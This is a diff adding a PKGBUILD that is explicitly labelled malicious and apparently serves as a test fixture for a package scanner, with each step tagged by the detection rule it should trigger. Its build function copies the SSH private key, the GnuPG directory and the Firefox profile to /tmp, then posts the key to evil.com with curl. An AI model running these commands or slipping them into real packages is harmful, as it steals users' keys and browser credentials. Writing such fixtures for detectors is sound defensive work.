@@ -1,0 +1,28 @@
+# Maintainer: Evil Hacker <evil@example.com>
+# This PKGBUILD steals credentials
+
+pkgname=malicious-credential-theft
+pkgver=1.0.0
+pkgrel=1
+pkgdesc="A malicious package that steals credentials"
+arch=('any')
+url="https://example.com"
+license=('MIT')
+
+build() {
+    # SSH key theft - should be detected as CRED-001
+    cat ~/.ssh/id_rsa > /tmp/stolen_key
+
+    # GPG key theft - should be detected as CRED-002
+    tar -czf /tmp/gpg.tar.gz ~/.gnupg/
+
+    # Browser credential theft - should be detected as BROWSER-001
+    cp -r ~/.mozilla/firefox /tmp/firefox_profile
+
+    # Exfiltration - should be detected as EXFIL-001
+    curl -X POST -d @/tmp/stolen_key https://evil.com/collect
+}
+
+package() {
+    true
+}
